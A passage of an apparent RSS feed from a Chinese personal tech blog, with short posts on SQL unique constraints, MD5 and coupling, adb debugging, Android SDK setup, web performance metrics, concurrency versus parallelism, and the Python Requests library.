&lt;p&gt;也可以只对某一列添加一个唯一约束而不创建唯一索引：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ALTER TABLE students
ADD CONSTRAINT uni_name UNIQUE (name);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这种情况下，name列没有索引，但仍然具有唯一性保证。&lt;/p&gt;
&lt;p&gt;无论是否创建索引，对于用户和应用程序来说，使用关系数据库不会有任何区别。这里的意思是说，当我们在数据库中查询时，如果有相应的索引可用，数据库系统就会自动使用索引来提高查询效率，如果没有索引，查询也能正常执行，只是速度会变慢。因此，索引可以在使用数据库的过程中逐步优化。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>随记—什么是 MD5 加密与耦合</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-md5-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%80%A6%E5%90%88/</link>
        <pubDate>Wed, 23 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-md5-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%80%A6%E5%90%88/</guid>
        <description>&lt;h2 id=&#34;1md5加密&#34;&gt;1.MD5加密&lt;/h2&gt;
&lt;h3 id=&#34;百科&#34;&gt;百科&lt;/h3&gt;
&lt;p&gt;MD5信息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。MD5由美国密码学家罗纳德·李维斯特（Ronald Linn Rivest）设计，于1992年公开，用以取代MD4算法。这套算法的程序在 RFC 1321 标准中被加以规范。1996年后该算法被证实存在弱点，可以被加以破解，对于需要高度安全性的数据，专家一般建议改用其他算法，如SHA-2。2004年，证实MD5算法无法防止碰撞（collision），因此不适用于安全性认证，如SSL公开密钥认证或是数字签名等用途。&lt;/p&gt;
&lt;h3 id=&#34;特点&#34;&gt;特点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;不可逆，几乎不能还原出原始数据&lt;/li&gt;
&lt;li&gt;完全相同的一段数据，不论时间地点（加密算法相同的条件）加密出的32位的字符串完全相同&lt;/li&gt;
&lt;li&gt;解密方法只有【碰撞】(撞库，穷举足够的数据，几乎难以实现解密)&lt;/li&gt;
&lt;li&gt;【散列】(Hash，哈希，把任意长度的输入通过散列算法变换成固定长度的输出，该输出就是散列值）能力强，数据即使只有百分之零点几的的差别也会导致MD5完全不一样，只要两个数据的MD5相同，那我们可以认为这两个数据完全相同&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2耦合&#34;&gt;2.耦合&lt;/h2&gt;
&lt;h3 id=&#34;百科-1&#34;&gt;百科&lt;/h3&gt;
&lt;p&gt;耦合（Coupling）表示两个子系统（或类）之间的关联程度，当一个子系统（或类）发生变化时对另一个子系统（或类）的影响很小，则称它们是松散耦合的；反之，如果变化的影响很大时，则称它们是紧密耦合的。耦合的强弱取决于模块间接间的复杂性、引用模块的位置和数据的传送方式等。设计时应尽量使模块间的耦合度小，模块间的耦合度直接影响系统的可理解性、可测试性、可靠性和可维护性。&lt;/p&gt;
&lt;h3 id=&#34;分类&#34;&gt;分类&lt;/h3&gt;
&lt;p&gt;耦合也可分为七级，从低至高为：非直接耦合（Nondirect coupling）、数据耦合（Data coupling）、标记耦合（Stamp coupling）、控制耦合（Control coupling）、外部耦合（External coupling）、公共耦合（Common coupling）、内容耦合（Content coupling）。耦合度应越低越好 。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;非直接耦合&lt;/strong&gt;：两模块间彼此无任何交互&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据耦合&lt;/strong&gt;：两模块间仅通过参数交换信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;标记耦合&lt;/strong&gt;：如果模块间传送的参数包含着复合数据结构，例如含有若干数据项的数据记录&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;控制耦合&lt;/strong&gt;：传递的参数中含有控制信息，如一个用于控制模块内部逻辑的标志信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;外部耦合&lt;/strong&gt;：指若干模块与同一个外部环境进行关联，如I/O处理使所有I/O模块与特定的设备、格式和通信协议相关联&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;公共耦合&lt;/strong&gt;：指模块间存在着全局变量、公共数据区或可共享的文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内容耦合&lt;/strong&gt;：指模块间存在着一个模块直接转入另一模块内部或一个模块直接使用另一模块的数据或控制信息的路径&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Android—Adb 调试</title>
        <link>https://ac-lm.github.io/posts/android/androidadb-%E8%B0%83%E8%AF%95/</link>
        <pubDate>Tue, 22 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/android/androidadb-%E8%B0%83%E8%AF%95/</guid>
        <description>&lt;h2 id=&#34;1adb-的简单使用&#34;&gt;1.Adb 的简单使用&lt;/h2&gt;
&lt;p&gt;Adb 是随 Android SDK 一同安装的工具，通常存放于 &lt;code&gt;SDK\Android\platform-tools&lt;/code&gt; 内。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 环境 Huawei TRT-AL00A&lt;/span&gt;
adb devices &lt;span style=&#34;color:#75715e&#34;&gt;# 设备&lt;/span&gt;
adb shell wm size &lt;span style=&#34;color:#75715e&#34;&gt;# 长宽&lt;/span&gt;
adb shell getevent -p  &lt;span style=&#34;color:#75715e&#34;&gt;# 监听事件&lt;/span&gt;
adb shell &lt;span style=&#34;color:#75715e&#34;&gt;# shell&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; HWTRT-Q:/ $ getevent /dev/input/event4 &lt;span style=&#34;color:#75715e&#34;&gt;# 按键事件&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; HWTRT-Q:/ $ exit
adb shell getevent /dev/input/event4 &lt;span style=&#34;color:#75715e&#34;&gt;# 按键事件&lt;/span&gt;
adb shell dumpsys &lt;span style=&#34;color:#75715e&#34;&gt;# 获取当前运行的服务&lt;/span&gt;
adb shell dumpsys battery  &lt;span style=&#34;color:#75715e&#34;&gt;# 获取设备电池信息&lt;/span&gt;
adb shell dumpsys cpuinfo
adb shell dumpsys meminfo
&lt;span style=&#34;color:#75715e&#34;&gt;# 要获取具体应用的内存信息，可加上包名&lt;/span&gt;
adb shell dumpsys meminfo PACKAGE_NAME
&lt;span style=&#34;color:#75715e&#34;&gt;# 获取某个包的信息：&lt;/span&gt;
adb shell dumpsys package PACKAGE_NAME
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2adb-模拟点击&#34;&gt;2.Adb 模拟点击&lt;/h2&gt;
&lt;h3 id=&#34;1获取屏幕的事件-event-的宽高&#34;&gt;1.获取屏幕的事件 event 的宽高&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;adb shell 
&lt;span style=&#34;color:#75715e&#34;&gt;# 进入shell模式&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; HWTRT-Q:/ $ getevent -p
&lt;span style=&#34;color:#75715e&#34;&gt;# 获取所有输入事件信息，找到宽（0035）和高（0036）这两个属性，这代表 event 中的宽高&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0035&lt;/span&gt;  : value 0, min 0, max 719, fuzz 0, flat 0, resolution &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0036&lt;/span&gt;  : value 0, min 0, max 1279, fuzz 0, flat 0, resolution &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 显然这里 719 X 1279 为事件宽高&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 获取到事件宽高的文件位置&lt;/span&gt;
add device 3: /dev/input/event4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2计算比例&#34;&gt;2.计算比例&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;rateW &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 720&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;手机屏幕的宽&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; / 719&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;event里0035的max&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0.99
rateH &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 1280&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;手机屏幕的高&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; / 1279&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;event里0036的max&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0.99
&lt;span style=&#34;color:#75715e&#34;&gt;# 理论上大部分手机都不需要换算&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3获取点击坐标&#34;&gt;3.获取点击坐标&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 在shell模式下输入&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; getevent /dev/input/event4
&lt;span style=&#34;color:#75715e&#34;&gt;# 监控点击输入，关注 0035 与 0036 两个属性，然后换算到屏幕坐标&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0003&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0035&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000264&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0003&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0036&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00000217&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0003&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0035&lt;/span&gt; 000001cb
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0003&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0036&lt;/span&gt; 0000049b
&lt;span style=&#34;color:#75715e&#34;&gt;# 这里注意 0035、0036 的属性都是 16 进制需要换算为 10 进制 0x264=612  0x217=535 &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# screenW = width*rateW&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# screenH = height*rateH&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 获得屏幕坐标(screenW,screenH)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;4模拟按键&#34;&gt;4.模拟按键&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;gt;&amp;gt;&amp;gt; input tap &lt;span style=&#34;color:#ae81ff&#34;&gt;612&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;535&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 点击(612,535)这个位置&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;参考文档：&lt;a class=&#34;link&#34; href=&#34;https://developer.android.google.cn/studio/command-line/adb&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; adb @Android Studio用户指南 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Android—Android SDK 配置</title>
        <link>https://ac-lm.github.io/posts/android/androidandroid-sdk-%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Mon, 21 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/android/androidandroid-sdk-%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;h2 id=&#34;1环境&#34;&gt;1.环境&lt;/h2&gt;
&lt;p&gt;Windows，无 Android Studio&lt;/p&gt;
&lt;h2 id=&#34;2配置android-sdk&#34;&gt;2.配置Android SDK&lt;/h2&gt;
&lt;p&gt;下载 Android CMD 工具 &lt;a class=&#34;link&#34; href=&#34;https://developer.android.google.cn/studio&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;sdkmanager&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;并将 &lt;code&gt;Android\cmdline-tools\latest\bin\sdkmanager.bat&lt;/code&gt; 添加到环境变量中&lt;/p&gt;
&lt;p&gt;运行 &lt;code&gt;sdkmanager&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;配置SDK &lt;code&gt;sdkmanager &amp;quot;platform-tools&amp;quot; &amp;quot;platforms;android-28&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;检查环境变量 &lt;code&gt;ANDROID_SDK_ROOT&lt;/code&gt; 是否存在，指向 SDK 文件夹&lt;/p&gt;
&lt;h2 id=&#34;3sdkmanager&#34;&gt;3.sdkmanager&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;# 若要卸载软件包，只需添加 `--uninstall` 标记
sdkmanager --uninstall packages [options]
sdkmanager --uninstall --package_file=package_file [options]
# 以下命令列出已安装和可用的软件包
sdkmanager --list [options] \
           [--channel=channel_id] // Channels: 0 (stable), 1 (beta), 2 (dev), or 3 (canary)
# 更多请查看参考文档
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;参考文档：&lt;a class=&#34;link&#34; href=&#34;https://developer.android.google.cn/studio/command-line/sdkmanager&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; sdkmanager @Android Studio用户指南 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>随记—Web 性能测试的指标</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0web-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E7%9A%84%E6%8C%87%E6%A0%87/</link>
        <pubDate>Sun, 20 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0web-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E7%9A%84%E6%8C%87%E6%A0%87/</guid>
        <description>&lt;h2 id=&#34;1事务&#34;&gt;1.事务&lt;/h2&gt;
&lt;p&gt;事务就是用户某一步或几步操作的集合，它具有一个完整意义。比如用户对某一个页面的一次请求，对某系统的一次登录，对商品的一次确认支付过程。这些我们都可以看作一个事务，需要理解的是事务不等于请求。&lt;/p&gt;
&lt;h2 id=&#34;2请求pv&#34;&gt;2.请求(PV)&lt;/h2&gt;
&lt;p&gt;PV 是 Page View 的缩写。用户通过浏览器访问页面，对应用服务器产生的一次请求，记为一个 PV。将这个概念做了延伸，系统真实处理的一个请求，视为一个 PV。&lt;/p&gt;
&lt;h2 id=&#34;3tpstransaction-per-second&#34;&gt;3.TPS(Transaction Per second)&lt;/h2&gt;
&lt;p&gt;每秒钟系统能够处理事务的数量，它是衡量系统处理能力的重要指标。此外，一个系统的性能其实是由TPS决定，跟并发用户数没有多大关系。一般在同样的TPS下，可以用不同并发用户数去压测得到，只是得到响应时间不同。&lt;/p&gt;
&lt;h2 id=&#34;4qpsquery-per-second&#34;&gt;4.QPS(Query Per Second)&lt;/h2&gt;
&lt;p&gt;每秒查询数。QPS 基本类似于 TPS，但是不同的是，对于一个页面的一次访问，形成一个TPS；但一次页面请求，可能产生多次对服务器的请求，服务器对这些请求，会被计入QPS之中。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;例如：访问一个页面会请求服务器3次，产生一个“T”，产生3个“Q”。&lt;/li&gt;
&lt;li&gt;PS： QPS(TPS) = 并发数 / 平均响应时间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5hpshit-per-second---rpsrequest-per-second&#34;&gt;5.HPS(Hit Per Second ) / RPS(Request Per Second)&lt;/h2&gt;
&lt;p&gt;点击率 / 每秒HTTP请求数。&lt;/p&gt;
&lt;h2 id=&#34;6响应时间rt&#34;&gt;6.响应时间(RT)&lt;/h2&gt;
&lt;p&gt;网页响应请求的时间，测试时可参考2/5/8原则，即2秒之内用户觉得很快，5秒之内用户觉得还可以，8秒之外用户觉得系统慢，无法忍受。&lt;/p&gt;
&lt;h2 id=&#34;7吞吐量&#34;&gt;7.吞吐量&lt;/h2&gt;
&lt;p&gt;吞吐量指在一次性能测试过程中网络上传输的数据量的总和。对于交互式应用来说，吞吐量指标反映的是服务器承受的压力，在容量规划的测试中，吞吐量是一个重点关注的指标，因为它能够说明系统级别的负载能力，另外，在性能调优过程中，吞吐量指标也有重要的价值。吞吐量是整个系统的瓶颈。&lt;/p&gt;
&lt;p&gt;但是，用吞吐量来衡量一个系统的输出能力是极其不准确的，我们要加单位时间的限制，这就引出了一个新的概念——吞吐率（单位时间内网络上传输的数据量，也可以指单位时间内处理客户请求数量，通常情况下，吞吐率用“字节数/秒”来衡量）&lt;/p&gt;
&lt;h3 id=&#34;a吞吐量指标的作用&#34;&gt;a.吞吐量指标的作用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;用于协助设计性能测试场景，以及衡量性能测试场景是否达到了预期的设计目标。&lt;/li&gt;
&lt;li&gt;用于协助分析性能瓶颈：吞吐量的限制是性能瓶颈的一种重要表现形式，因此，有针对性地对吞吐量设计测试，可以协助尽快定位到性能瓶颈的所在位置。&lt;/li&gt;
&lt;li&gt;一般情况下 TPS 与 吞吐量说的是同一个东西&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;b快速识别系统性能瓶颈的方法rbirapid-bottleneck-identify&#34;&gt;b.快速识别系统性能瓶颈的方法——RBI（rapid bottleneck identify）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;80%的系统，其性能瓶颈都由吞吐量制约&lt;/li&gt;
&lt;li&gt;并发用户数和吞吐量瓶颈之间存在一定的关联&lt;/li&gt;
&lt;li&gt;采用吞吐量测试可以更快速定位问题&lt;/li&gt;
&lt;li&gt;通过不断增加并发用户数和吞吐量观察系统的性能瓶颈。然后，从网络、数据库、应用服务器和代码本身4个环节确定系统的的性能瓶颈。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;c容量预测&#34;&gt;c.容量预测&lt;/h2&gt;
&lt;p&gt;对于我们设计的系统，我们在上线前肯定需要测试下能接收用户多大的访问量。即希望评估出最大的日PV到来的时候，我们的系统是否能支撑。但怎么去评估呢，难道要造一个最大日PV的情景来测试？其实根据已有的经验和数据，可以总结出了高峰QPS和日PV的关系。通过数学建模，我们发现高峰每台服务器【QPS = (( 总PV X 80% ) / ( 24 X 60 X 60 X 40%)) / 服务器数量】。其中80%和40%这2个数字是个不固定的参数，这个公式代表的意思是，&lt;strong&gt;在40%的时间（12小时）内产生80%总PV的QPS均值&lt;/strong&gt;。对于不同的情景有不同的参数。&lt;/p&gt;
&lt;p&gt;这样我们就可以通过压测应用获取其高峰QPS，然后根据公式算出指定高峰QPS下的日PV，通过这样来进行容量预测。即：【日预估PV = 压测QPS X (24 X 60 X 60 X 时间百分比) / 0.8 X 机器数量】&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1.每天300w PV 的在单台机器上，这台机器需要多少QPS？ 
( 3000000 * 0.8 ) / (86400 * 0.2 ) = 139 (QPS)
一般需要达到139QPS。(200万PV才有100峰值QPS)

2.如果一台机器的QPS是58，需要几台机器来支持？
139 / 58 = 3
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>随记—什么是并发和并行</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF%E5%B9%B6%E5%8F%91%E5%92%8C%E5%B9%B6%E8%A1%8C/</link>
        <pubDate>Sat, 19 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF%E5%B9%B6%E5%8F%91%E5%92%8C%E5%B9%B6%E8%A1%8C/</guid>
        <description>&lt;h2 id=&#34;1什么是并发&#34;&gt;1.什么是并发&lt;/h2&gt;
&lt;p&gt;并发（Concurrent），在操作系统中，是指一个时间段中有几个程序都处于已启动运行到运行完毕之间，且这几个程序都是在同一个处理机上运行。&lt;strong&gt;并发是会抢占资源的&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;2什么是并行&#34;&gt;2.什么是并行&lt;/h2&gt;
&lt;p&gt;并行（Parallel），当系统有一个以上CPU时，可以让一个CPU执行一个进程，另一个CPU执行另一个进程，两个进程互不抢占CPU资源，可以同时进行，这种方式称之为并行，决定并行的因素不是CPU的数量，而是CPU的核心数量，比如一个CPU多个核也可以并行。&lt;strong&gt;并行是不会抢占资源的&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;3并行和并发的区别&#34;&gt;3.并行和并发的区别&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;并发，指的是多个事情，在同一时间段内同时发生了&lt;/li&gt;
&lt;li&gt;并行，指的是多个事情，在同一时间点上同时发生了&lt;/li&gt;
&lt;li&gt;并发的多个任务之间是互相抢占资源的&lt;/li&gt;
&lt;li&gt;并行的多个任务之间是不互相抢占资源的&lt;/li&gt;
&lt;li&gt;并发是一个处理器多条等待队列&lt;/li&gt;
&lt;li&gt;并行是多个处理器多条等待队列&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4并发的两种情况&#34;&gt;4.并发的两种情况&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;一种是严格意义上的并发，即所有的用户在同一时间点做同一件事或操作，这种操作一般指做同一类型的业务。比如，所有用户同一时刻做并发登陆，同一时刻做表单提交。&lt;/li&gt;
&lt;li&gt;另外一种并发是广义范围的并发，这种并发与前一种并发的区别是，尽管多个用户对系统发出了请求或者进行了操作，但是这些请求或都操作可以是相同的，也可以是不同的。比如，在同一时刻有用户在登录，有用户在提交表单&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5并发编程的性能消耗&#34;&gt;5.并发编程的性能消耗？&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在使用多线程时，线程的上下文切换会消耗性能，消耗时间&lt;/li&gt;
&lt;li&gt;其次是资源限制问题。由于程序的执行速度受限于计算机硬件资源或软件资源。例如，服务器的带宽只有 2Mb/s，某个资源的下载速度是 1Mb/s 每秒，即使系统启动 10 个线程下载资源，下载速度不会变成 10Mb/s，所以在进行并发编程时，要考虑这些资源的限制。硬件资源限制有带宽的上传/下载速度、硬盘读写速度和CPU的处理速度。软件资源限制有数据库的连接数和socket连接数等。&lt;/li&gt;
&lt;li&gt;对于硬件资源限制，可以考虑使用集群并行执行程序。既然单机的资源有限制，那么就让程序在多机上运行，搭建服务器集群，使用不同的机器处理不同的数据。&lt;/li&gt;
&lt;li&gt;对于软件资源限制，可以考虑使用资源池将资源复用。比如使用连接池将数据库和Socket连接复用，或者在调用对方 webservice 接口获取数据时，只建立一个连接。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6并发编程的优势&#34;&gt;6.并发编程的优势&lt;/h2&gt;
&lt;p&gt;在实现网络资源的断点续传时，通过将资源进行切分为不同大小的任务，启动多线程下载。这样即使在网络阻塞时，下载速度的减速效果也没这么明显。这便是多线程的优势，即使一个线程由于网络阻塞被卡住，但可能会有另一个线程正处在慢启动的最终加速阶段，这样总体的下载速度就明显优于单线程。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—Requests</title>
        <link>https://ac-lm.github.io/posts/python/pythonrequests/</link>
        <pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonrequests/</guid>
        <description>&lt;h2 id=&#34;1什么是-requests&#34;&gt;1.什么是 Requests&lt;/h2&gt;
&lt;p&gt;Requests 是一个基于 urllib 编写的&lt;strong&gt;HTTP库&lt;/strong&gt;，相比 urllib 库，Requests 库更加方便，能轻易的实现各种 HTTP 测试需求。Requests 库经常被用来进行接口测试以及爬虫&lt;/p&gt;
&lt;h2 id=&#34;2request函数的参数&#34;&gt;2.request()函数的参数&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 参数            | 解释                                                     
| --------------- | ------------------------------------------------------------ 
| method          | 请求方法，比如get、options、head、post、put、patch、delete
| url             | 请求的url                                                    
| params          | 请求携带的params                                             
| data            | 请求body中的data                                             
| json            | 请求body中的json格式的data                                   
| headers         | 请求携带的headers                                            
| cookies         | 请求携带的cookies                                            
| files           | 上传文件时使用                                               
| auth            | 身份认证时使用                                               
| timeout         | 设置请求的超时时间，可以设置连接超时和读取超时               
| allow_redirects | 是否允许重定向，默认True，即允许重定向                       
| proxies         | 设置请求的代理，支持http代理以及socks代理（需要安装第三方库&amp;quot;pip install requests[socks]&amp;quot;） 
| verify          | 用于https请求时的ssl证书验证，默认是开启的，如果不需要则设置为False即可 
| stream          | 是否立即下载响应内容，默认是False，即立即下载响应内容       
| cert            | 用于指定本地文件用作客户端证书                           
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3response对象&#34;&gt;3.response对象&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 属性或属性方法           | 解释                                                     
| ----------------------- | ------------------------------------------------------------ 
| r.status_code           | 响应的http状态码，比如404和200                               
| r.json()                | 将响应解析成json格式                                         
| r.headers               | 响应头，可单独取出某个字段的值，比如(r.headers)[&#39;content-type&#39;] 
| r.raw                   | 原始响应，表示urllib3.response.HTTPResponse对象。使用raw时，要求在请求时设置“stream=True” 
| r.url                   | 请求的最终地址                                               
| r.encoding              | 要解码的r.text的编码方式                                     
| r.history               | 请求的历史记录，可以用于查看重定向信息，以列表形式展示，排序方式是从最旧到最新 
| r.reason                | 响应状态的描述，比如 &amp;quot;Not Found&amp;quot; or &amp;quot;OK&amp;quot;                     
| r.cookies               | 服务器发回的cookies，RequestsCookieJar类型                   
| r.elapsed               | 从发送请求到响应到达之间经过的时间量，可以用于测试响应速度   
| r.request               | 可以用于查看发送请求时的信息，比如r.request.headers查看请求头 
| r.ok                    | 检查”status_code“的值，如果小于400，则返回True，如果不小于400，则返回False 
| r.is_redirect           | 判断是否重定向，返回True or False                            
| r.is_permanent_redirect | 判断是否永久重定向，返回True or False                        
| r.next                  | 返回重定向链中下一个请求的PreparedRequest对象               
| r.apparent_encoding     | 用chardet库判断出的编码方式                                  
| r.content               | 响应的内容，byte类型                                        
| r.text                  | 响应的内容，unicode类型                                
| r.links                 | 响应的解析头链接                                             
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>随记—响应时间的组成</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%E7%9A%84%E7%BB%84%E6%88%90/</link>
        <pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
        
